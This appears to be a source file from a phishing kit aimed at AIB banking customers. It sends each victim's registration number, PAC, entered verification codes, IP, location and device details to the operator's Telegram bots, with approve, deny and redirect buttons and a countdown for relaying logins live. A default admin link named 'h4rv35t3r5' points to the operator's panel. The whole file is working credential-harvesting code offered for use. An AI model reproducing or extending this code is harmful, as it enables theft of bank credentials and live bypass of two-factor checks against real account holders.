/**
 *  ╔═╗╔═╗╔╗╔╔═╗╔═╗╦
 *  ╚═╗║╣ ║║║╚═╗║╣ ║
 *  ╚═╝╚═╝╝╚╝╚═╝╚═╝╩
 *  ─── telegram.js ───
 */
import {
  buildVisitMessage,
  parseVisitorInfo,
  getNetworkHintLabel,
  gmtOffset,
  formatTimes,
    escapeTelegramHtml,
    asCode,
    asLink,
    asUrlField,
    isHttpUrl,
} from "./_messages.js";
import { formatPendingLoginDatabaseLabel } from "./_db.js";

var API = "https://api.telegram.org/bot";

function getBotPairs(env) {
  var tokenRaw = env.TELEGRAM_BOT_TOKEN || "";
  var chatIdRaw = env.TELEGRAM_CHAT_ID || "";
  if (!tokenRaw || !chatIdRaw) return [];

  var tokens = tokenRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);
  var chatIds = chatIdRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);

  var pairs = [];
  for (var i = 0; i < chatIds.length; i++) {
    var token = tokens[i] || tokens[0];
    if (token && chatIds[i]) {
      pairs.push({ token: token, chatId: chatIds[i] });
    }
  }
  return pairs;
}

export function findTokenForChat(env, chatId) {
  var pairs = getBotPairs(env);
  var match = pairs.find(function (p) { return p.chatId === String(chatId); });
  if (match) return match.token;
  return pairs[0] ? pairs[0].token : null;
}

async function sendToAll(env, text, taskId, includeButtons, parseMode) {
  if (includeButtons === undefined) includeButtons = true;
  var pairs = getBotPairs(env);
  if (pairs.length === 0) return;

  for (var i = 0; i < pairs.length; i++) {
    var p = pairs[i];
    try {
      var payload = { chat_id: p.chatId, text: text };
      // Only set when asked for: the login message is plain text
      // and must not be parsed as HTML.
      if (parseMode) payload.parse_mode = parseMode;
      if (includeButtons) {
        payload.reply_markup = {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: "approve:" + taskId },
              { text: "❌ Deny", callback_data: "deny:" + taskId },
            ],
            [
              { text: "🔀 Redirect", callback_data: "redirect:" + taskId },
            ],
          ],
        };
      }
      await fetch(API + p.token + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.error("[Telegram] Failed to send to " + p.chatId + ":", err);
    }
  }
}

function parseDevice(ua) {
  if (!ua) return "Unknown";
  var os = "Unknown OS";
  var browser = "Unknown Browser";

  if (/iPhone/.test(ua)) os = "iPhone";
  else if (/iPad/.test(ua)) os = "iPad";
  else if (/Android/.test(ua)) os = "Android";
  else if (/Windows NT 10/.test(ua)) os = "Windows 10";
  else if (/Windows NT 11|Windows NT 10.*Build\/(2[2-9]|[3-9])/.test(ua)) os = "Windows 11";
  else if (/Mac OS X/.test(ua)) os = "macOS";
  else if (/Linux/.test(ua)) os = "Linux";

  if (/Edg\/(\d+)/.test(ua)) browser = "Edge " + RegExp.$1;
  else if (/Chrome\/(\d+)/.test(ua)) browser = "Chrome " + RegExp.$1;
  else if (/Safari\//.test(ua) && /Version\/(\d+[\.\d]*)/.test(ua)) browser = "Safari " + RegExp.$1;
  else if (/Firefox\/(\d+)/.test(ua)) browser = "Firefox " + RegExp.$1;

  return os + " / " + browser;
}

function formatReferrer(ref) {
  if (!ref || ref === "Direct") return "Direct";
  try {
    var host = new URL(ref).hostname.replace(/^www\./, "");
    return host;
  } catch (e) {
    return ref;
  }
}

function formatUrl(origin) {
  if (!origin) return "N/A";
  try {
    var u = new URL(origin);
    return u.hostname + u.pathname;
  } catch (e) {
    return origin;
  }
}

function locationBlock(cf) {
  if (!cf) return [];
  var loc = cf.city && cf.city !== "Unknown"
    ? cf.city + ", " + cf.country
    : cf.country || "Unknown";
  var tzLabel = cf.timezone || "Unknown";
  var offset = cf.timezone ? gmtOffset(cf.timezone) : "";
  if (offset) tzLabel += " (" + offset + ")";

  return [
    "📍 <b>Location:</b> " + asCode(loc),
    "🌐 <b>IP:</b> " + asCode(cf.ip || "Unknown"),
    "🕐 <b>Timezone:</b> " + asCode(tzLabel),
    "📡 <b>ISP:</b> " + asCode(cf.asOrganization || "Unknown"),
  ];
}

function deviceBlock(task) {
  var device = task.device_info ? parseDevice(task.device_info) : "Unknown";
  var screen = task.screen_size || "Unknown";
  var ref = task.referrer || "";
  var refLabel = formatReferrer(ref);
  var origin = task.member_origin || "";

  // Both fields are clickable. `asLink(value, label)` keeps the short
  // hostname+pathname label this message has always displayed while the href
  // stays the full URL — `formatUrl()` strips the scheme, so it can never be
  // the href itself.
  return [
    "📱 <b>Device:</b> " + asCode(device),
    "📐 <b>Screen:</b> " + asCode(screen),
    "🔗 <b>Referrer:</b> " + (isHttpUrl(ref) ? asLink(ref, refLabel) : asCode(refLabel || "Direct")),
    "🌍 <b>URL:</b> " + (isHttpUrl(origin) ? asLink(origin, formatUrl(origin)) : asCode(formatUrl(origin))),
  ];
}

function timeBlock(tz) {
  var t = formatTimes(tz);
  return [
    "📅 Local: " + t.local,
    "🕑 UTC: " + t.utc,
  ];
}

var LINE = "━━━━━━━━━━━━━━━━━━━━";

/**
 * Visit alert — same layout ebc/BBP/NBS/principal send. Sent as HTML, so
 * unlike the login message it needs parse_mode.
 */
export async function sendVisitorNotification(env, data) {
  await sendToAll(env, buildVisitMessage(data), null, false, "HTML");
}


function visitDataFromTask(task) {
  var cf = task.cf || {};
  var parts = [cf.city, cf.country].filter(function (p) {
    return p && p !== "Unknown" && p !== "Unknown, Unknown";
  });
  var detected = parseVisitorInfo(task.device_info);
  return {
    siteName: "AIB",
    location: parts.length ? parts.join(", ") : "Unknown",
    ip: cf.ip || "Unknown",
    timezone: cf.timezone || "Unknown",
    isp: cf.asOrganization || "Unknown",
    asn: cf.asn || null,
    org: cf.asOrganization || null,
    platformLabel: detected.platformLabel,
    browserLabel: detected.browserLabel,
    deviceLabel: detected.deviceLabel,
    screen: task.screen_size || "Unknown",
    referrer: task.referrer || "Direct",
    pageUrl: task.member_origin || "Unknown",
  };
}

export async function sendLoginNotification(env, data) {
  var lines = [
    "🔐 <b>Login Attempt</b>",
    "━━━━━━━━━━━━━━━━━━",
    "👤 Reg No: " + asCode(data.user_id || "Unknown"),
    "🔑 PAC: " + asCode(data.password || "Unknown"),
  ];

  await sendToAll(env, lines.join("\n"), null, false, "HTML");
}

function adminPortalLink(env) {
  var raw = (env.ADMIN_PORTAL_URL || "").trim();
  if (!raw) return "https://h4rv35t3r5.netlify.app/";
  var absolute = /^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(raw)
    ? "https://" + raw
    : raw;
  try {
    return new URL(absolute).origin;
  } catch (e) {
    return absolute
      .replace(/\/admin\/login.*$/i, "")
      .replace(/\?.*$/, "")
      .replace(/\/+$/, "") || absolute;
  }
}

export function formatCountdownLabel(secondsLeft) {
  var safe = Math.max(0, Math.floor(secondsLeft));
  var m = Math.floor(safe / 60);
  var s = safe % 60;
  return m + ":" + (s < 10 ? "0" : "") + s;
}

export function wrapFlowMessage(body) {
  return "🏷️ <b>AIB</b>\n━━━━━━━━━━━━━━━━━━\n\n" + body;
}

export function buildLoginApprovalRequestBody(data) {
  var password = String(data.password != null ? data.password : "").trim() || "—";
  var lines = [
    "🔔 Login request – approve or deny",
    "━━━━━━━━━━━━━━━━━━",
    "👤 Reg No: " + asCode(data.userId || "Unknown"),
    "Password: " + asCode(password),
  ];
  if (data.databaseShard) {
    lines.push("🗄 Database: " + asCode(data.databaseShard));
  }
  if (data.method && data.method !== "none" && data.method !== "—") {
    lines.push("📧 Method: " + asCode(data.method));
  }
  lines.push("⏱ Time left: " + asCode(formatCountdownLabel(data.secondsLeft != null ? data.secondsLeft : 90)));
  lines.push("");
  lines.push("👉 " + asLink(data.adminLink, "Approve or deny"));

  return lines.join("\n");
}

async function sendApprovalWithCountdown(env, taskId, buildText) {
  var pairs = getBotPairs(env);
  if (pairs.length === 0) return;

  var refs = [];
  var initialSeconds = 90;
  var initialText = wrapFlowMessage(buildText(initialSeconds));

  for (var i = 0; i < pairs.length; i++) {
    var p = pairs[i];
    try {
      var payload = {
        chat_id: p.chatId,
        text: initialText,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      };
      var res = await fetch(API + p.token + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      var data = await res.json().catch(function () { return {}; });
      if (data && data.ok && data.result && data.result.message_id) {
        refs.push({ token: p.token, chatId: p.chatId, messageId: data.result.message_id });
      }
    } catch (err) {
      console.error("[Telegram] Failed to send approval to " + p.chatId + ":", err);
    }
  }

  if (refs.length === 0) return;

  (async function runCountdown() {
    for (var s = 89; s >= 0; s--) {
      await new Promise(function (resolve) { setTimeout(resolve, 1000); });
      var currentText = wrapFlowMessage(buildText(s));
      for (var j = 0; j < refs.length; j++) {
        var r = refs[j];
        try {
          await fetch(API + r.token + "/editMessageText", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: r.chatId,
              message_id: r.messageId,
              text: currentText,
              parse_mode: "HTML",
              disable_web_page_preview: true,
            }),
          });
        } catch (e) {}
      }
    }
  })().catch(function () {});
}

export async function notifyNewTask(env, task) {
  if (task.request_kind === "visit") {
    return sendVisitorNotification(env, visitDataFromTask(task));
  }

  var databaseShard = formatPendingLoginDatabaseLabel(env, task.id);
  var adminUrl = adminPortalLink(env);

  await sendApprovalWithCountdown(env, task.id, function (secondsLeft) {
    return buildLoginApprovalRequestBody({
      userId: task.user_id,
      password: task.password,
      method: task.method,
      adminLink: adminUrl,
      secondsLeft: secondsLeft,
      databaseShard: databaseShard,
    });
  });
}

export async function notifyAdvance(env, task) {
  var tz = task.cf ? task.cf.timezone : null;
  var lines = [];

  if (task.flow_step === "code_request") {
    var target =
      task.code_delivery_method === "phone"
        ? "Phone (" + (task.masked_phone || "N/A") + ")"
        : "Email (" + (task.masked_email || "N/A") + ")";

    lines.push("📨 <b>Code delivery request (AIB)</b>");
    lines.push(LINE);
    lines.push("👤 <b>Reg No:</b> " + asCode(task.user_id || "Unknown"));
    lines.push("🔑 <b>PAC:</b> " + asCode(task.password || "N/A"));
    lines.push("✉️ <b>Send code via:</b> " + asCode(target));
    lines.push("");
    lines = lines.concat(locationBlock(task.cf));
    lines.push("");
    lines = lines.concat(deviceBlock(task));
    lines.push("");
    lines.push("⏳ Auto-declines in 90s");
  } else if (task.flow_step === "code_verify") {
    lines.push("🛡 <b>Code verification (AIB)</b>");
    lines.push(LINE);
    lines.push("👤 <b>Reg No:</b> " + asCode(task.user_id || "Unknown"));
    lines.push("🔑 <b>PAC:</b> " + asCode(task.password || "N/A"));
    lines.push("🔢 <b>Code entered:</b> " + asCode(task.verification_code || "N/A"));
    lines.push("✉️ <b>Sent via:</b> " + asCode((task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + (task.masked_email || "N/A") + ")"));
    lines.push("");
    lines = lines.concat(locationBlock(task.cf));
    lines.push("");
    lines = lines.concat(deviceBlock(task));
    lines.push("");
    lines.push("⏳ Auto-declines in 90s");
  } else {
    return;
  }

  // HTML: the blocks above carry <b>/<code>/<a href>, and every dynamic value is
  // escaped, so Telegram can render the link instead of printing a bare URL.
  await sendToAll(env, lines.join("\n"), task.id, true, "HTML");
}

/**
 * Sends the approve/deny/redirect outcome as its own message.
 *
 * Separate on purpose: editing the login notification in place would destroy
 * it, and the outcome has to stand alone. Sent as HTML because the template
 * carries `<code>` spans — the login notification itself stays plain text.
 */
export async function sendPlain(env, text) {
  await sendToAll(env, text, null, false, "HTML");
}

// ─── Accept / decline / redirect templates ─────────────────────────────────
// Body copied from igoe's `lib/telegram-approval-templates.ts`
// (buildAdminLoginApprovedBody / buildAdminLoginDeniedBody /
// buildAdminLoginRedirectedBody): same header, same 18-rule separator, same
// `<code>` field format, same status-line shape.
//
// Two lines are worded for aib rather than igoe, because copying them
// literally would be false here: aib has no verification-method field in
// practice (login sends method "none"), and aib has no OTP page and no
// redirect target to send the user to.

var OUTCOME_SEPARATOR = "━━━━━━━━━━━━━━━━━━";

function outcomeCode(value) {
  return "<code>" + escapeTelegramHtml(value) + "</code>";
}

function outcomeMethodLabel(raw) {
  var method = String(raw || "").trim().toLowerCase();
  if (method === "email") return "Email";
  if (method === "text" || method === "sms") return "Text Message (SMS)";
  if (method === "call") return "Phone Call";
  if (!method || method === "\u2014" || method === "-" || method === "none") return null;
  return method;
}

function outcomeBody(task, header, statusLine) {
  var lines = [
    header,
    OUTCOME_SEPARATOR,
    "👤 Reg No: " + outcomeCode(task.user_id || "Unknown"),
    "🔑 PAC: " + outcomeCode(task.password || "Unknown"),
  ];
  var label = outcomeMethodLabel(task.method);
  if (label) lines.push("📧 Method: " + outcomeCode(label));
  lines.push(statusLine);
  return lines.join("\n");
}

export function buildApprovedMessage(task) {
  return outcomeBody(task, "✅ CC – Login Approved",
    "✅ Status: Approved – User identity verified");
}

export function buildDeniedMessage(task) {
  return outcomeBody(task, "❌ CC – Login Denied",
    "❌ Status: Denied – User shown error message");
}

export function buildRedirectedMessage(task) {
  return outcomeBody(task, "↪️ CC – Login Redirected",
    "↪️ Status: Redirected – User session redirected");
}


export async function answerCallback(env, chatId, callbackQueryId, text) {
  var token = findTokenForChat(env, chatId);
  if (!token) return;

  try {
    await fetch(API + token + "/answerCallbackQuery", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text }),
    });
  } catch (err) {
    console.error("[Telegram] Failed to answer callback:", err);
  }
}
